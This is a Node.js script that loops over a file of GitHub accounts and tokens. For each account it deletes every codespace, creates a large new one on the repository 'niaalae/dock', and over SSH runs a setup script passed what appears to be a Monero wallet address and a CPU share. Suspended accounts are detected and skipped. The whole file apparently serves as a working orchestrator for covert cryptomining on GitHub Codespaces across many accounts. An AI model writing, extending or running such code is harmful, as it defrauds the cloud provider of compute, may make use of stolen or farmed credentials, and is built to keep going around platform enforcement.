const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

// CONFIGURATION
const tokensPath = path.join(__dirname, 'github_tokens.json');
const targetRepo = 'niaalae/dock';
const idleTimeout = 240; // minutes
const setupCommand = 'cd /workspaces/dock && sudo ./setup.sh 49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F 85';

function readTokens() {
    if (!fs.existsSync(tokensPath)) {
        console.error('github_tokens.json not found');
        return [];
    }
    try {
        const tokens = JSON.parse(fs.readFileSync(tokensPath, 'utf8'));
        return Array.isArray(tokens) ? tokens : [];
    } catch (e) {
        console.error('Failed to parse github_tokens.json:', e.message);
        return [];
    }
}

async function orchestrateOne(tokenObj) {
    const { username, token } = tokenObj;
    console.log(`\n[${username}] Processing account...`);

    const env = { ...process.env, GH_TOKEN: token };

    // 1. Delete all existing codespaces
    try {
        console.log(`[${username}] Deleting existing codespaces...`);
        execSync('gh codespace delete --all --force', { env, stdio: 'inherit' });
    } catch (err) {
        if (err.message.includes('403') || err.message.includes('suspended')) {
            console.error(`[${username}] ❌ Account SUSPENDED. Skipping.`);
            return;
        }
        console.error(`[${username}] Delete failed (maybe no codespaces?):`, err.message);
    }

    // 2. Create new codespace
    let codespaceName = '';
    try {
        console.log(`[${username}] Creating new codespace for ${targetRepo} (Machine: standardLinux32gb)...`);
        const createCmd = `gh codespace create --repo ${targetRepo} --machine standardLinux32gb --idle-timeout ${idleTimeout}m`;
        const result = execSync(createCmd, { env, encoding: 'utf8' }).trim();
        const lines = result.split('\n');
        codespaceName = lines[lines.length - 1].trim();
        console.log(`[${username}] Created codespace: ${codespaceName}`);
    } catch (err) {
        if (err.message.includes('403') || err.message.includes('suspended')) {
            console.error(`[${username}] ❌ Account SUSPENDED. Skipping.`);
            return;
        }
        console.error(`[${username}] Creation failed:`, err.message);
        return;
    }

    // 3. Run setup command via SSH (non-critical - codespace is already created)
    try {
        console.log(`[${username}] Connecting via SSH and running setup...`);
        // Wait for codespace to fully initialize
        await new Promise(r => setTimeout(r, 8000));

        // Correct syntax: gh codespace ssh -c <NAME> "<COMMAND>"
        execSync(`gh codespace ssh -c ${codespaceName} "${setupCommand}"`, { env, stdio: 'inherit' });
        console.log(`[${username}] ✓ Setup command executed successfully.`);
    } catch (err) {
        // Setup failures are non-critical - codespace is created and accessible
        if (err.message.includes('GPG error') || err.message.includes('exit status 100')) {
            console.warn(`[${username}] ⚠️  Setup script failed (known GPG issue in dock repo). Codespace created successfully.`);
        } else {
            console.warn(`[${username}] ⚠️  Setup command failed but codespace is accessible:`, err.message);
        }
    }
}

async function start() {
    const tokens = readTokens();
    if (tokens.length === 0) {
        console.log('No tokens to process.');
        return;
    }

    console.log(`Starting orchestration for ${tokens.length} accounts...`);
    for (const tokenObj of tokens) {
        try {
            await orchestrateOne(tokenObj);
        } catch (e) {
            console.error(`Unexpected error for ${tokenObj.username}:`, e.message);
        }
    }
    console.log('\nAll accounts processed.');
}

if (require.main === module) {
    start();
}
